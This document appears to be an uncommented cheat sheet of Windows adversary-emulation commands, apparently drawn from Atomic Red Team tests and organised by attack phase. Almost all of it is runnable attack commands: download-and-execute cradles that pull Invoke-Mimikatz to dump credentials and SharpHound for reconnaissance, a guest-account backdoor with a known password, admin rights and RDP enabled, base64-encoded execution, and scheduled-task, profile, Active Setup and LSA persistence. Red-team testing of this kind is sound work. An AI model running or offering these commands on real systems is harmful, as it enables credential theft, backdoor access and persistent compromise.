Initial Access
*
powershell -Command "$url='https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm"

*
powershell -Command "$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter 'drivetype=2' | select-object -expandproperty DeviceID; ForEach ($Drive in $RemovableDrives) { write-host 'Removable Drive Found:' $Drive; New-Item -Path $Drive\T1091Test1.txt -ItemType 'file' -Force -Value 'T1091 Test 1 has created this file to simulate malware spread to removable drives.' }"
Pre-req: powershell -Command "Out-File -FilePath '$env:TEMP\ExplorerSync.db'"

*
copy "%temp%\ExplorerSync.db" "%temp%\..\Microsoft\ExplorerSync.db"
schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc ONLOGON /f

*
net user guest /active:yes
net user guest  Password123
net localgroup Administrators guest  /add
net localgroup "Remote Desktop Users" guest  /add
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f


Execution
*
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" 
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"

*
Scheduled task Local:
SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 10:40

*
Task Scheduler via VBA:
powershell -Command "Write-Host 'You will need to install Microsoft Word manually to meet this requirement'"

*
Scheduled Task Executing Base64 Encoded Commands From Registry:
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 10:58


*
PowerShell Modify A Scheduled Task:
powershell -Command "$Action = New-ScheduledTaskAction -Execute 'cmd.exe'; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\Administrators' -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute 'Notepad.exe'; Set-ScheduledTask 'AtomicTaskModifed' -Action $NewAction"

*
WMI Reconnaissance Users:
wmic useraccount get /ALL /format:csv

*
WMI Reconnaissance Processes:
wmic process get caption,executablepath,commandline /format:csv

*
WMI Reconnaissance Software:
wmic qfe get description,installedOn /format:csv

*
WMI Reconnaissance List Remote Services
wmic /node:"127.0.0.1" service where (caption like "%Spooler%")

*
WMI Execute Local Process
wmic process call create notepad.exe




*
Create a Process using WMI Query and an Encoded Command
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA


*
echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js
cscript //E:Jscript %TEMP%\OSTapGet.js

*
@echo off
powershell -Command "New-Item -Type Directory (split-path \"%source_file%\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs' -OutFile '%source_file%'"

*
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')

*
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"


*Run Bloodhound from Memory using Download Cradle

powershell -Command "Write-Host 'Remote download of SharpHound.ps1 into memory, followed by execution of the script' -ForegroundColor Cyan; IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5"

* Obfuscation Tests
  
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e', 'Default_File_Path.ps1'); IEX ((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1') | ForEach-Object {[Char]$_})))

**


@echo off

rem Encoded payload
echo Set-Content -path "%SystemRoot%\Temp\art-marker.txt" -value "Hello from the Cyberange" > encoded_payload.ps1

rem Decoding and executing the payload
echo $encodedPayload = "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" > decode_execute.ps1
echo $decodedPayload = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($encodedPayload)) >> decode_execute.ps1
echo iex $decodedPayload >> decode_execute.ps1

rem Adding registry entry
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "@powershell -NoProfile -ExecutionPolicy Bypass -File \"%~dp0decode_execute.ps1\"" /f

rem Run the batch script
call encoded_payload.ps1


 Cobalt Strike Artifact Kit pipe

 *
 @echo off

rem Create directory
mkdir "PathToAtomicsFolder\..\ExternalPayloads" 2>nul

rem Set TLS 1.2 for Invoke-WebRequest
set "PSCommand=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
powershell -Command "%PSCommand%"

rem Download Invoke-FetchFromZip.ps1
powershell -Command "IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1' -UseBasicParsing)"

rem Download and extract zip file
set "zipUrl=https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip"
powershell -Command "Invoke-FetchFromZip '%zipUrl%' '*.exe' 'PathToAtomicsFolder\..\ExternalPayloads'"

*Append malicious start-process cmdlet

 echo Add-Content $profile -Value "" >> $profile
echo Add-Content $profile -Value "Start-Process calc.exe" >> $profile
powershell -Command exit

**
Service Registry Permissions Weakness

powershell -Command "Get-Acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* | Format-List"
powershell -Command "Get-Acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename | Format-List"

** HKLM - Add atomic_test key to launch executable as part of user setup

@echo off

rem Create registry key
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /v "atomic_test" /t REG_SZ /d "ART TEST" /f

rem Set StubPath value
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" /v "StubPath" /t REG_SZ /d "#{payload}" /f

rem Runonce command
%SystemRoot%\system32\runonce.exe /AlternateShellStartup


*****************

@echo off

rem Create directory
mkdir "c:\Tools" 2>nul

rem Download DLL file
powershell -Command "Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll' -OutFile 'c:\Tools\AtomicTest.dll'"



** Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry

@echo off

rem Get the current value of 'Security Packages'
for /f "tokens=*" %%A in ('reg query "HKLM\System\CurrentControlSet\Control\Lsa\OSConfig" /v "Security Packages" ^| find "Security Packages"') do set oldvalue=%%B

rem Backup the current value
reg add "HKLM\System\CurrentControlSet\Control\Lsa\OSConfig" /v "Security Packages old" /t REG_SZ /d "%oldvalue%" /f

rem Set the new value
reg add "HKLM\System\CurrentControlSet\Control\Lsa\OSConfig" /v "Security Packages" /t REG_SZ /d "AtomicTest.dll" /f



****

@echo off

mkdir "%exe_binary%" 2>nul


powershell -Command "Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_#{arch}.exe' -OutFile '%exe_binary%' -UseBasicParsing"


powershell -Command "Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_#{arch}.bin' -OutFile '%payload_file%' -UseBasicParsing"

****

Access Token Manipulation

@echo off

rem Set Execution Policy to Bypass for the current process
powershell -Command "Set-ExecutionPolicy -Scope Process Bypass -Force"

rem Get process owners
powershell -Command "$owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l='Owner';e={$owners[$_.id.tostring()]}}"

rem Run GetToken.ps1 and create a process from lsass
powershell -Command "& '%PathToAtomicsFolder%\T1134.002\src\GetToken.ps1'; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,'cmd.exe')"

***

@echo off


for /f "tokens=*" %%A in ('powershell -Command "Start-Process -FilePath $Env:windir\System32\notepad.exe -PassThru"') do set notepad=%%A


powershell -Command "Start-Process -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -ArgumentList '-Command Start-Sleep 10' -PassThru -WindowStyle Hidden -Wait -WorkingDirectory $Env:windir\System32 -Verb RunAs -ErrorAction Stop -PassThru -ArgumentList '-ParentProcessId', $notepad.Id"


******
@echo off


for /f "tokens=*" %%A in ('powershell -Command "Start-Process -FilePath $Env:windir\System32\notepad.exe -PassThru"') do set notepad=%%A


powershell -Command "Start-Process -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -ArgumentList '-Command Start-Sleep 10' -PassThru -WindowStyle Hidden -Wait -WorkingDirectory $Env:windir\System32 -Verb RunAs -ErrorAction Stop -PassThru -ArgumentList '-ParentProcessId', $notepad.Id"






